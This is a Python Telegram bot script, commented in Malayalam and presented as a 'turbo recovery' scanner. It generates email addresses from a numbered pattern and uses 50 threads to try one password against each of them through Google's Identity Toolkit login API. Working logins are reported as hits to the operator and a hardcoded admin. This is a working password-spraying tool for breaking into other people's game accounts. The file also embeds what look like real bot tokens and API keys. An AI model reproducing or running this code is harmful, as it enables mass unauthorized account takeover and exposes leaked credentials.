import telebot
import requests
from telebot import types
from threading import Thread
from flask import Flask
import os
import time
from concurrent.futures import ThreadPoolExecutor

# --- SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "🔥 TURBO SCANNER IS RUNNING!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
# നീ നൽകിയ ഏറ്റവും പുതിയ ടോക്കൺ ഇവിടെ നൽകിയിട്ടുണ്ട്
TOKEN = "8574711169:AAEpY7ydcHy1nYoZnNVLi4w63HHnxNqamhM"
bot = telebot.TeleBot(TOKEN, threaded=True)

# നിന്റെ അഡ്മിൻ ഐഡി
ADMIN_ID = 7212602902 

API_KEYS = {
    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_states = {}
# ഒരേ കണക്ഷൻ വീണ്ടും ഉപയോഗിക്കാൻ Session
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount('https://', adapter)

# --- CORE LOGIN FUNCTION ---
def login_acc(email, password, version="CPM2"):
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[version]}"
        r = session.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=5)
        if r.status_code == 200:
            return email
    except:
        return None
    return None

# --- BOT HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        return bot.send_message(message.chat.id, "🚫 No Access!")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔍 Start Turbo Recovery", callback_data="mode_recover"))
    bot.send_message(message.chat.id, "🔥 **FLAME TURBO MASTER**\n\nChoose an action:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "mode_recover")
def handle_recover(call):
    msg = bot.send_message(call.message.chat.id, "📧 **Recovery Format അയക്കുക:**\n(Ex: `cpmegy_{}_cpm@gmail.com`)")
    bot.register_next_step_handler(msg, get_format)

def get_format(message):
    user_states[message.chat.id] = {'format': message.text.strip()}
    msg = bot.send_message(message.chat.id, "🔢 **Range അയക്കുക (Start:End):**\n(Ex: `1000:2000`)")
    bot.register_next_step_handler(msg, get_range)

def get_range(message):
    try:
        start_n, end_n = map(int, message.text.split(':'))
        user_states[message.chat.id]['start'] = start_n
        user_states[message.chat.id]['end'] = end_n
        msg = bot.send_message(message.chat.id, "🔑 **Password to check?**")
        bot.register_next_step_handler(msg, run_turbo_scan)
    except:
        bot.send_message(message.chat.id, "❌ Format error! `1000:2000` പോലെ അയക്കൂ.")

def run_turbo_scan(message):
    cid = message.chat.id
    pwd = message.text.strip()
    data = user_states.get(cid)
    fmt = data['format']
    
    bot.send_message(cid, f"🚀 **Turbo Scan Started!**\nRange: {data['start']} - {data['end']}")

    def task():
        found = 0
        emails_to_check = []
        for i in range(data['start'], data['end'] + 1):
            email = fmt.replace("{}", str(i))
            emails_to_check.append(email)

        # 30 മിനിറ്റിൽ 1 ലക്ഷം അക്കൗണ്ടുകൾ എന്ന സ്പീഡിനായി Workers കൂട്ടി
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(lambda e: login_acc(e, pwd), emails_to_check))

        for res in results:
            if res:
                found += 1
                bot.send_message(cid, f"✅ **HIT:** `{res}`")
                bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{res}` Found!")

        bot.send_message(cid, f"🏁 **Scan Completed!**\nTotal Found: {found}")

    Thread(target=task).start()

if __name__ == "__main__":
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    bot.infinity_polling(skip_pending=True)
